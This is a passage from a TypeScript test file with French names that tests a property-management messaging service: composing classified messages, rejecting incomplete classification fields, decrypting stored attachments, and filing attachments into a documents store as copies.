      const resultat = await messagesCommunicationService.composer(userId, {
        destinataire: "adresse-non-repertoriee@example.com",
        objet: "Bonjour",
        corps: "Message de test",
        classificationType: "garant",
        classificationId: garant.id
      });

      expect(resultat?.classificationType).toBe("garant");
      expect(resultat?.classificationId).toBe(garant.id);
    });

    it("composer rejette classificationType sans classificationId", async () => {
      await configurerBoite();
      await expect(
        messagesCommunicationService.composer(userId, {
          destinataire: "quelquun@example.com",
          objet: "Bonjour",
          corps: "Message de test",
          classificationType: "locataire"
        })
      ).rejects.toThrow(BadRequestException);
      expect(sendMailMock).not.toHaveBeenCalled();
    });

    it("composer rejette classificationId sans classificationType", async () => {
      await configurerBoite();
      await expect(
        messagesCommunicationService.composer(userId, {
          destinataire: "quelquun@example.com",
          objet: "Bonjour",
          corps: "Message de test",
          classificationId: randomUUID()
        })
      ).rejects.toThrow(BadRequestException);
      expect(sendMailMock).not.toHaveBeenCalled();
    });

    it("obtenirContenuPieceJointe déchiffre le contenu réellement stocké", async () => {
      await configurerBoite();
      const contenu = Buffer.from("%PDF-1.4 contenu réel de test");
      const messageId = await smtpEnvoiService.envoyerEmail(organisationId, "x@example.com", "Objet", "Corps", {
        nomFichier: "fichier.pdf",
        contenu,
        mimeType: "application/pdf"
      });
      const [piece] = await db.select().from(pieceJointeMessage).where(eq(pieceJointeMessage.messageId, messageId));

      const resultat = await messagesCommunicationService.obtenirContenuPieceJointe(piece!.id);
      expect(resultat.contenu.equals(contenu)).toBe(true);
      expect(resultat.nomFichier).toBe("fichier.pdf");
    });

    it("classerDansDocuments copie le contenu vers le système documents, jamais un partage de cheminStockage", async () => {
      await configurerBoite();
      const [locataire] = await db
        .insert(locataires)
        .values({ nom: "Devos", prenom: "Ilan", organisationId })
        .returning();
      if (!locataire) throw new Error("Échec de l'insertion du locataire de test");
      const contenu = Buffer.from("%PDF-1.4 pièce à classer");
      const messageId = await smtpEnvoiService.envoyerEmail(organisationId, "x@example.com", "Objet", "Corps", {
        nomFichier: "piece.pdf",
        contenu,
        mimeType: "application/pdf"
      });
      const [piece] = await db.select().from(pieceJointeMessage).where(eq(pieceJointeMessage.messageId, messageId));

      const document = await messagesCommunicationService.classerDansDocuments(piece!.id, {
        entiteType: "locataire",
        entiteId: locataire.id,
        categorie: "courrier"
      });

      expect(document.nomFichier).toBe("piece.pdf");
      expect(document.categorie).toBe("courrier");
      const [documentEnBase] = await db.select().from(documents).where(eq(documents.id, document.id));
      expect(documentEnBase?.cheminStockage).not.toBe(piece!.cheminStockage);
    });
  });
});
